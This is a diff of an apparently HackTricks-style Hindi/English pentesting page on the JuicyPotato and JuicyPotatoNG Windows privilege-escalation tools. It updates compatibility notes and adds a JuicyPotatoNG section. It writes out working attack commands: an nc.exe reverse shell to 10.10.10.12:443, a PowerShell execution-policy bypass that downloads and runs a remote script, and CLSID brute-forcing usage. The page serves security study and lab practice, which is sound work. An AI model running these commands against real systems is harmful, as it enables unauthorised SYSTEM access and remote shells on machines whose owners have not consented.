@@ -2,54 +2,60 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-> [!WARNING] > **JuicyPotato Windows Server 2019 और Windows 10 build 1809 से काम नहीं करता है। हालांकि, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) का उपयोग **समान विशेषाधिकारों का लाभ उठाने और `NT AUTHORITY\SYSTEM`** स्तर की पहुंच प्राप्त करने के लिए किया जा सकता है। _**जांचें:**_
+> [!WARNING] > JuicyPotato legacy है। यह सामान्यतः Windows 10 1803 / Windows Server 2016 तक के Windows वर्शन पर काम करता है। Microsoft द्वारा Windows 10 1809 / Server 2019 में शुरू की गई hardening ने मूल तकनीक को तोड़ दिया। उन बिल्ड्स और नए वर्शनों के लिए PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato और अन्य आधुनिक विकल्पों पर विचार करें। अप-टू‑डेट विकल्पों और उपयोग के लिए नीचे दी गई पृष्ठ देखें।
+
 
 {{#ref}}
 roguepotato-and-printspoofer.md
 {{#endref}}
 
-## Juicy Potato (सुनहरे विशेषाधिकारों का दुरुपयोग) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>
+## Juicy Potato (गोल्डन privileges का दुरुपयोग) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>
 
-_एक मीठा संस्करण_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, जिसमें थोड़ा सा जूस है, यानी **एक और स्थानीय विशेषाधिकार वृद्धि उपकरण, Windows सेवा खातों से NT AUTHORITY\SYSTEM**_
+_A sugared version of_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, with a bit of juice, i.e. **another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM**_
 
 #### आप juicypotato को [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts) से डाउनलोड कर सकते हैं
 
-### सारांश <a href="#summary" id="summary"></a>
+### Compatibility quick notes
 
-[**juicy-potato Readme से**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**
+- वर्तमान context के पास `SeImpersonatePrivilege` या `SeAssignPrimaryTokenPrivilege` होने पर यह Windows 10 1803 और Windows Server 2016 तक विश्वसनीय रूप से काम करता है।
+- Windows 10 1809 / Windows Server 2019 और बाद के वर्शनों में Microsoft hardening के कारण यह टूट गया है। उन बिल्ड्स के लिए ऊपर लिंक किए गए विकल्पों का उपयोग करें।
 
-[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) और इसके [वेरिएंट](https://github.com/decoder-it/lonelypotato) विशेषाधिकार वृद्धि श्रृंखला का लाभ उठाते हैं जो [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [सेवा](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) पर आधारित है जिसमें `127.0.0.1:6666` पर MiTM श्रोता है और जब आपके पास `SeImpersonate` या `SeAssignPrimaryToken` विशेषाधिकार होते हैं। एक Windows बिल्ड समीक्षा के दौरान, हमने एक सेटअप पाया जहां `BITS` जानबूझकर बंद था और पोर्ट `6666` लिया गया था।
+### Summary <a href="#summary" id="summary"></a>
 
-हमने [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) को हथियार बनाने का निर्णय लिया: **Juicy Potato को नमस्ते कहें**।
+[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**
 
-> सिद्धांत के लिए, देखें [Rotten Potato - सेवा खातों से SYSTEM तक विशेषाधिकार वृद्धि](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) और लिंक और संदर्भों की श्रृंखला का पालन करें।
+[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) और इसके [variants](https://github.com/decoder-it/lonelypotato) उस privilege escalation chain का उपयोग करते हैं जो `BITS` service पर आधारित है, जिसमें MiTM listener `127.0.0.1:6666` पर चलता है और जब आपके पास `SeImpersonate` या `SeAssignPrimaryToken` privileges होते हैं। Windows build review के दौरान हमें एक सेटअप मिला जहाँ `BITS` जानबूझकर disabled था और port `6666` पहले से लिया हुआ था।
 
-हमने खोजा कि, `BITS` के अलावा, कई COM सर्वर हैं जिनका हम दुरुपयोग कर सकते हैं। उन्हें बस यह करना है:
+हमने [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) को weaponize करने का निर्णय लिया: **Juicy Potato से मिलिए**।
 
-1. वर्तमान उपयोगकर्ता द्वारा इंस्टेंटिएबल होना चाहिए, सामान्यतः एक "सेवा उपयोगकर्ता" जिसके पास अनुकरण विशेषाधिकार होते हैं
-2. `IMarshal` इंटरफेस को लागू करना चाहिए
-3. एक ऊंचे उपयोगकर्ता (SYSTEM, Administrator, …) के रूप में चलाना चाहिए
+> सिद्धांत के लिए देखें [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) और लिंक/संदर्भों की श्रृंखला का पालन करें।
 
-कुछ परीक्षणों के बाद, हमने कई Windows संस्करणों पर [दिलचस्प CLSID की एक विस्तृत सूची प्राप्त की और परीक्षण किया](http://ohpe.it/juicy-potato/CLSID/)।
+हमने पाया कि `BITS` के अलावा भी कई COM servers हैं जिनका हम दुरुपयोग कर सकते हैं। उन्हें बस निम्न चाहिए:
 
-### Juicy विवरण <a href="#juicy-details" id="juicy-details"></a>
+1. वर्तमान user द्वारा instantiate किए जाने योग्य होना चाहिए, सामान्यतः एक “service user” जिसके पास impersonation privileges होते हैं
+2. `IMarshal` interface को implement करना चाहिए
+3. elevated user (SYSTEM, Administrator, …) के रूप में चलना चाहिए
 
-JuicyPotato आपको अनुमति देता है:
+कुछ परीक्षणों के बाद हमने कई Windows वर्शनों पर रुचिकर CLSID’s की एक विस्तृत सूची प्राप्त और परखी। [यहाँ](http://ohpe.it/juicy-potato/CLSID/) सूची OS के अनुसार व्यवस्थित मिलती है।
 
-- **लक्ष्य CLSID** _कोई भी CLSID चुनें जो आप चाहते हैं। [_यहाँ_](http://ohpe.it/juicy-potato/CLSID/) _आप OS द्वारा व्यवस्थित सूची पा सकते हैं।_
-- **COM सुनने वाला पोर्ट** _आप पसंद का COM सुनने वाला पोर्ट परिभाषित करें (हार्डकोडेड 6666 के बजाय)_
-- **COM सुनने वाला IP पता** _किसी भी IP पर सर्वर को बाइंड करें_
-- **प्रक्रिया निर्माण मोड** _अनुकरण किए गए उपयोगकर्ता के विशेषाधिकार के आधार पर आप चुन सकते हैं:_
-- `CreateProcessWithToken` (को `SeImpersonate` की आवश्यकता है)
-- `CreateProcessAsUser` (को `SeAssignPrimaryToken` की आवश्यकता है)
-- `दोनों`
-- **लॉन्च करने के लिए प्रक्रिया** _यदि शोषण सफल होता है तो एक निष्पादन योग्य या स्क्रिप्ट लॉन्च करें_
-- **प्रक्रिया तर्क** _लॉन्च की गई प्रक्रिया के तर्कों को अनुकूलित करें_
-- **RPC सर्वर पता** _एक छिपे हुए दृष्टिकोण के लिए आप एक बाहरी RPC सर्वर पर प्रमाणित कर सकते हैं_
-- **RPC सर्वर पोर्ट** _यदि आप एक बाहरी सर्वर पर प्रमाणित करना चाहते हैं और फ़ायरवॉल पोर्ट `135` को ब्लॉक कर रहा है तो उपयोगी है…_
-- **परीक्षण मोड** _मुख्य रूप से परीक्षण उद्देश्यों के लिए, यानी CLSIDs का परीक्षण करना। यह DCOM बनाता है और टोकन के उपयोगकर्ता को प्रिंट करता है। परीक्षण के लिए_ [_यहाँ देखें_](http://ohpe.it/juicy-potato/Test/)
+### Juicy details <a href="#juicy-details" id="juicy-details"></a>
 
-### उपयोग <a href="#usage" id="usage"></a>
+JuicyPotato आपको निम्न करने देता है:
+
+- **Target CLSID** _अपना कोई भी CLSID चुनें._ [_Here_](http://ohpe.it/juicy-potato/CLSID/) _आप वहां OS के अनुसार सूची पा सकते हैं._
+- **COM Listening port** _अपनी पसंद का COM listening port निर्धारित करें (marshalled hardcoded 6666 की बजाय)_
+- **COM Listening IP address** _सर्वर को किसी भी IP पर bind करें_
+- **Process creation mode** _impersonated user के privileges के आधार पर आप निम्न में से चुन सकते हैं:_
+  - `CreateProcessWithToken` (needs `SeImpersonate`)
+  - `CreateProcessAsUser` (needs `SeAssignPrimaryToken`)
+  - `both`
+- **Process to launch** _यदि exploitation सफल होता है तो एक executable या script लॉन्च करें_
+- **Process Argument** _लॉन्च किए गए प्रोसेस के arguments को कस्टमाइज़ करें_
+- **RPC Server address** _stealthy तरीके के लिए आप किसी external RPC server पर authenticate कर सकते हैं_
+- **RPC Server port** _उपयोगी जब आप external server पर authenticate करना चाहते हों और firewall port `135` ब्लॉक कर रहा हो…_
+- **TEST mode** _मुख्यतः परीक्षण उद्देश्यों के लिए, जैसे CLSIDs का परीक्षण। यह DCOM बनाता है और token का user प्रिंट करता है। देखें_ [_here for testing_](http://ohpe.it/juicy-potato/Test/)
+
+### Usage <a href="#usage" id="usage"></a>
 ```
 T:\>JuicyPotato.exe
 JuicyPotato v0.1
@@ -66,23 +72,44 @@ Optional args:
 -k <ip>: RPC server ip address (default 127.0.0.1)
 -n <port>: RPC server listen port (default 135)
 ```
-### अंतिम विचार <a href="#final-thoughts" id="final-thoughts"></a>
+### Final thoughts <a href="#final-thoughts" id="final-thoughts"></a>
 
-[**juicy-potato Readme से**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**
+[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**
 
-यदि उपयोगकर्ता के पास `SeImpersonate` या `SeAssignPrimaryToken` विशेषाधिकार हैं तो आप **SYSTEM** हैं।
+यदि उपयोगकर्ता के पास `SeImpersonate` या `SeAssignPrimaryToken` अधिकार हैं तो आप **SYSTEM** हैं।
 
-इन सभी COM सर्वरों के दुरुपयोग को रोकना लगभग असंभव है। आप `DCOMCNFG` के माध्यम से इन वस्तुओं के अनुमतियों को संशोधित करने के बारे में सोच सकते हैं लेकिन शुभकामनाएँ, यह चुनौतीपूर्ण होने वाला है।
+इन सभी COM Servers के दुरुपयोग को रोकना लगभग असंभव है। आप इन ऑब्जेक्ट्स की अनुमतियों को `DCOMCNFG` के माध्यम से बदलने के बारे में सोच सकते हैं लेकिन शुभकामनाएँ — यह चुनौतीपूर्ण होगा।
 
-वास्तविक समाधान संवेदनशील खातों और अनुप्रयोगों की सुरक्षा करना है जो `* SERVICE` खातों के तहत चलते हैं। `DCOM` को रोकना निश्चित रूप से इस शोषण को रोक देगा लेकिन इससे अंतर्निहित OS पर गंभीर प्रभाव पड़ सकता है।
+वास्तविक समाधान संवेदनशील खातों और उन applications की सुरक्षा करना है जो `* SERVICE` accounts के तहत चलती हैं। `DCOM` को रोकना निश्चित रूप से इस exploit को बाधित करेगा लेकिन इससे underlying OS पर गंभीर प्रभाव पड़ सकता है।
 
-से: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)
+From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)
+
+## JuicyPotatoNG (2022+)
+
+JuicyPotatoNG आधुनिक Windows पर JuicyPotato-शैली का local privilege escalation पुनः प्रस्तुत करता है, निम्न को संयोजित करके:
+- चुने हुए पोर्ट पर लोकल RPC सर्वर के लिए DCOM OXID resolution, पुराने हार्डकोडेड 127.0.0.1:6666 listener से बचते हुए।
+- एक SSPI hook जो inbound SYSTEM authentication को capture और impersonate करता है बिना RpcImpersonateClient की ज़रूरत के, जो तब भी CreateProcessAsUser सक्षम करता है जब केवल SeAssignPrimaryTokenPrivilege मौजूद हो।
+- DCOM activation constraints को पूरा करने के तरीके (उदा., PrintNotify / ActiveX Installer Service classes को निशाना बनाते समय पहले के INTERACTIVE-group की आवश्यकता)।
+
+Important notes (evolving behavior across builds):
+- September 2022: Initial technique worked on supported Windows 10/11 and Server targets using the “INTERACTIVE trick”.
+- January 2023 update from the authors: Microsoft later blocked the INTERACTIVE trick. A different CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) restores exploitation but only on Windows 11 / Server 2022 according to their post.
+
+Basic usage (more flags in the help):
+```
+JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
+# Useful helpers:
+#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
+#  -s  Scan for a COM port not filtered by Windows Defender Firewall
+#  -i  Interactive console (only with CreateProcessAsUser)
+```
+अगर आप Windows 10 1809 / Server 2019 को लक्षित कर रहे हैं जहाँ क्लासिक JuicyPotato पैच किया जा चुका है, तो ऊपर लिंक किए गए विकल्पों (RoguePotato, PrintSpoofer, EfsPotato/GodPotato, आदि) को प्राथमिकता दें। NG बिल्ड और सर्विस की स्थिति पर निर्भर करके परिस्थितिजन्य हो सकता है।
 
 ## उदाहरण
 
-नोट: कोशिश करने के लिए CLSIDs की सूची के लिए [इस पृष्ठ](https://ohpe.it/juicy-potato/CLSID/) पर जाएं।
+नोट: कोशिश करने के लिए CLSIDs की सूची के लिए [this page](https://ohpe.it/juicy-potato/CLSID/) पर जाएँ।
 
-### एक nc.exe रिवर्स शेल प्राप्त करें
+### nc.exe reverse shell प्राप्त करें
 ```
 c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *
 
@@ -95,34 +122,33 @@ Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
 
 c:\Users\Public>
 ```
-### पॉवरशेल रिव
+### Powershell rev
 ```
 .\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
 ```
-### एक नया CMD लॉन्च करें (यदि आपके पास RDP एक्सेस है)
+### एक नई CMD लॉन्च करें (यदि आपके पास RDP एक्सेस है)
 
 ![](<../../images/image (300).png>)
 
 ## CLSID समस्याएँ
 
-अक्सर, JuicyPotato द्वारा उपयोग किया जाने वाला डिफ़ॉल्ट CLSID **काम नहीं करता** है और एक्सप्लॉइट विफल हो जाता है। आमतौर पर, एक **काम करने वाले CLSID** को खोजने के लिए कई प्रयासों की आवश्यकता होती है। एक विशिष्ट ऑपरेटिंग सिस्टम के लिए प्रयास करने के लिए CLSIDs की सूची प्राप्त करने के लिए, आपको इस पृष्ठ पर जाना चाहिए:
+अक्सर, JuicyPotato द्वारा उपयोग किया जाने वाला डिफ़ॉल्ट CLSID **काम नहीं करता** और exploit विफल हो जाता है। आमतौर पर, एक **काम करने वाला CLSID** खोजने में कई प्रयास लगते हैं। किसी विशिष्ट ऑपरेटिंग सिस्टम के लिए परीक्षण करने के लिए CLSID की सूची प्राप्त करने हेतु आपको इस पृष्ठ पर जाना चाहिए:
 
-{{#ref}}
-https://ohpe.it/juicy-potato/CLSID/
-{{#endref}}
+- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)
 
-### **CLSID की जांच करना**
+### **CLSID की जाँच**
 
-पहले, आपको juicypotato.exe के अलावा कुछ निष्पादन योग्य फ़ाइलों की आवश्यकता होगी।
+सबसे पहले, आपको juicypotato.exe के अलावा कुछ executables चाहिए होंगे।
 
-[Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) डाउनलोड करें और इसे अपने PS सत्र में लोड करें, और [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1) डाउनलोड और निष्पादित करें। यह स्क्रिप्ट परीक्षण के लिए संभावित CLSIDs की एक सूची बनाएगी।
+Join-Object.ps1 डाउनलोड करें और इसे अपनी PS session में लोड करें, और GetCLSID.ps1 डाउनलोड करके execute करें। वह script संभावित CLSID की सूची बनाएगा जिन्हें टेस्ट किया जा सकता है।
 
-फिर [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)डाउनलोड करें (CLSID सूची और juicypotato निष्पादन योग्य के लिए पथ बदलें) और इसे निष्पादित करें। यह हर CLSID को आज़माना शुरू कर देगा, और **जब पोर्ट नंबर बदलता है, तो इसका मतलब होगा कि CLSID काम कर गया**।
+फिर test_clsid.bat डाउनलोड करें (CLSID सूची और juicypotato executable के path को बदलें) और इसे execute करें। यह हर CLSID को आजमाना शुरू कर देगा, और **जब port number बदलता है, तो इसका मतलब होगा कि CLSID काम कर गया**।
 
-**पैरामीटर -c का उपयोग करके** काम करने वाले CLSIDs की **जांच करें**
+**-c पैरामीटर का उपयोग करके काम करने वाले CLSIDs की जांच करें**
 
 ## संदर्भ
 
 - [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)
+- [Giving JuicyPotato a second chance: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
 
 {{#include ../../banners/hacktricks-training.md}}
